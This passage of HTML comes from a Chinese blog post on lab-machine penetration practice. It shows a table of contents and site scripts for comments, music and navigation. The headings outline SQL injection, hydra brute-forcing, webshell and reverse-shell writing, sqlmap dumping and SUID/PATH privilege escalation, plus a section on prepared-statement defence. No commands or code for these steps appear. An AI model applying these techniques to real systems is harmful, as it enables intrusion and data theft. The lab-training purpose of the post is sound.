class="toc-number">3.6.</span> <span class="toc-text">Apport&#x2F;AbrtApport&#x2F;Abrt 提权成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">3.7.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-Apport%EF%BC%9F"><span class="toc-number">3.7.1.</span> <span class="toc-text">什么是 Apport？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nullbyte-SQL-%E6%B3%A8%E5%85%A5%E5%A4%A7%E8%B5%8F%EF%BC%8C4-%E7%A7%8D%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%EF%BC%8C1-%E6%AC%A1%E5%91%88%E7%8E%B0%EF%BC%81"><span class="toc-number">4.</span> <span class="toc-text">Nullbyte - SQL 注入大赏，4 种注入方式，1 次呈现！</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-3"><span class="toc-number">4.1.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC-%E5%9C%A8%E9%9D%9E%E5%B8%B8%E9%87%8D%E8%A6%81%EF%BC%8C%E9%9C%80%E8%A6%81%E5%85%B3%E6%B3%A8"><span class="toc-number">4.1.1.</span> <span class="toc-text">RPC 在非常重要，需要关注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Checklist"><span class="toc-number">4.2.</span> <span class="toc-text">渗透测试 Checklist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-1"><span class="toc-number">4.3.</span> <span class="toc-text">Web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF%E8%AF%A6%E7%BB%86"><span class="toc-number">4.3.1.</span> <span class="toc-text">图片信息详细</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exiftool-%E4%B8%93%E9%97%A8%E7%94%A8%E6%9D%A5%E6%9F%A5%E7%9C%8B%E5%9B%BE%E7%89%87%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">exiftool  专门用来查看图片的工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E8%BF%98%E6%9C%89-string-binwalk"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">其他工具还有 string**	**binwalk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-kzMb5nVYJw-%E8%BF%9B%E8%A1%8C-ssh-%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.3.2.</span> <span class="toc-text">用 kzMb5nVYJw 进行 ssh 连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-2"><span class="toc-number">4.3.3.</span> <span class="toc-text">目录爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">JavaScript 禁止访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uploads-%E8%AE%BF%E9%97%AE%E4%BA%86%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BF%A1%E6%81%AF"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">uploads 访问了也没有信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8-kzMb5nVYJwphpmyadmin-%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5"><span class="toc-number">4.3.3.3.</span> <span class="toc-text">用 kzMb5nVYJw	phpmyadmin 登录失败</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-kzMb5nVYJw-%E4%BD%9C%E4%B8%BA-url-%E8%B7%AF%E5%BE%84-%E6%88%90%E5%8A%9F"><span class="toc-number">4.3.4.</span> <span class="toc-text">用 kzMb5nVYJw 作为 url 路径**	**成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-web-%E8%A1%A8%E5%8D%95"><span class="toc-number">4.4.</span> <span class="toc-text">hydra 暴力破解 web 表单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-GET-%E8%AF%B7%E6%B1%82%E8%A1%A8%E5%8D%95"><span class="toc-number">4.4.1.</span> <span class="toc-text">A. GET 请求表单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-POST-%E8%AF%B7%E6%B1%82%E8%A1%A8%E5%8D%95%EF%BC%88%E6%9C%80%E5%B8%B8%E8%A7%81%EF%BC%89"><span class="toc-number">4.4.2.</span> <span class="toc-text">B. POST 请求表单（最常见）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E5%A4%84%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">4.4.3.</span> <span class="toc-text">此处的构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">4.5.</span> <span class="toc-text">SQL 注入-常规注入查数据库信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%8C%B9%E9%85%8D%E5%AD%97%E7%AC%A6"><span class="toc-number">4.5.1.</span> <span class="toc-text">判断匹配字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">4.5.2.</span> <span class="toc-text">order by 判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">4.5.3.</span> <span class="toc-text">联合查询判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#database-version-version-user-%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.5.4.</span> <span class="toc-text">database()**	@@version  &#x2F; version()	user()	**的查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%87%BA%E6%95%B4%E4%B8%AA-mysql-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E5%90%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">4.5.5.</span> <span class="toc-text">爆出整个 mysql 数据库的所有数据库和各数据库的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seth-%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E9%9D%A2%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">4.5.6.</span> <span class="toc-text">seth 这个数据库里面的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-seth-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84-users-%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E5%AD%97%E6%AE%B5"><span class="toc-number">4.5.7.</span> <span class="toc-text">查看 seth 数据库的 users 表中的列有多少个字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-seth-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84-users-%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF"><span class="toc-number">4.5.8.</span> <span class="toc-text">查看 seth 数据库的 users 表中的所有信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.6.</span> <span class="toc-text">密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64"><span class="toc-number">4.6.1.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-identifier"><span class="toc-number">4.6.2.</span> <span class="toc-text">hash-identifier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#john-%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.6.3.</span> <span class="toc-text">john 破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell-1"><span class="toc-number">4.7.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E5%B0%8F%E9%A9%AC-%E2%80%93%E4%B8%80%E8%88%AC%E6%88%90%E5%8A%9F%E6%A6%82%E7%8E%87%E5%BE%88%E4%BD%8E"><span class="toc-number">4.8.</span> <span class="toc-text">SQL 注入-写入一句话木马(小马)–一般成功概率很低</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97-webshell"><span class="toc-number">4.8.1.</span> <span class="toc-text">获得 webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8Fcat-%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C-sql-%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">4.8.2.</span> <span class="toc-text">⚠️cat 可以执行 sql 命令的文件的内容，看是否有数据库连接的账户密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9-shell-%E5%A4%A7%E9%A9%AC-%E2%80%93"><span class="toc-number">4.9.</span> <span class="toc-text">SQL 注入-写入反弹 shell(大马)–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-sqlmap-%E8%87%AA%E5%8A%A8"><span class="toc-number">4.10.</span> <span class="toc-text">SQL 注入-sqlmap 自动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.10.1.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8"><span class="toc-number">4.10.2.</span> <span class="toc-text">数据库的表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-number">4.10.3.</span> <span class="toc-text">表中的字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump-%E8%BD%AC%E5%82%A8%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%86%85%E5%AE%B9"><span class="toc-number">4.10.4.</span> <span class="toc-text">dump 转储表中的所有内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">4.11.</span> <span class="toc-text">SUID 可执行文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%92%E9%99%A4-proc-%E7%9B%AE%E5%BD%95%EF%BC%9F"><span class="toc-number">4.11.1.</span> <span class="toc-text">为什么排除&#x2F;proc 目录？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%A6%86%E7%85%A7"><span class="toc-number">4.11.2.</span> <span class="toc-text">定妆照</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.12.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%8D%E5%90%8C%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">4.12.1.</span> <span class="toc-text">sql 注入的不同注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#version-%E7%9A%84%E4%B8%8D%E5%90%8C%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F"><span class="toc-number">4.12.2.</span> <span class="toc-text">version 的不同查询方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH-%E5%8A%AB%E6%8C%81"><span class="toc-number">4.12.3.</span> <span class="toc-text">PATH 劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E6%80%9D%E8%B7%AF"><span class="toc-number">4.12.4.</span> <span class="toc-text">重要思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%BB%E5%BA%95%E7%9A%84-sql-%E9%98%B2%E8%8C%83%EF%BC%8C%E9%A2%84%E5%A4%84%E7%90%86-%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A"><span class="toc-number">5.</span> <span class="toc-text">彻底的 sql 防范，预处理 + 参数绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%85%88%E5%8F%91%E9%80%81-%E2%80%9CSQL-%E6%A8%A1%E6%9D%BF%E2%80%9D%EF%BC%8C%E5%9B%BA%E5%AE%9A%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="toc-number">5.0.1.</span> <span class="toc-text">1. 预处理阶段：先发送 “SQL 模板”，固定执行逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%BB%A5-%E2%80%9C%E7%BA%AF%E5%80%BC%E2%80%9D-%E4%BC%A0%E9%80%92%EF%BC%8C%E4%B8%8D%E5%8F%82%E4%B8%8E-SQL-%E8%A7%A3%E6%9E%90"><span class="toc-number">5.0.2.</span> <span class="toc-text">2. 参数绑定阶段：数据以 “纯值” 传递，不参与 SQL 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E7%94%A8%E7%BB%91%E5%AE%9A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%E6%A8%A1%E6%9D%BF%EF%BC%8C%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%BC%9A%E8%A2%AB%E6%89%A7%E8%A1%8C"><span class="toc-number">5.0.3.</span> <span class="toc-text">3. 执行阶段：用绑定的数据填充模板，数据不会被执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF-XSS-%E7%BB%84%E5%90%88%E6%8B%B3%E5%AE%9E%E6%88%98-CSDN-%E5%8D%9A%E5%AE%A2"><span class="toc-number">6.</span> <span class="toc-text">CSRF+XSS 组合拳实战-CSDN 博客</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（三）/">靶机精炼-思路为王（三）</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧\\x7e","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/03/20/靶机精炼-思路为王（四）/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello，欢迎你们来到博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">...</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
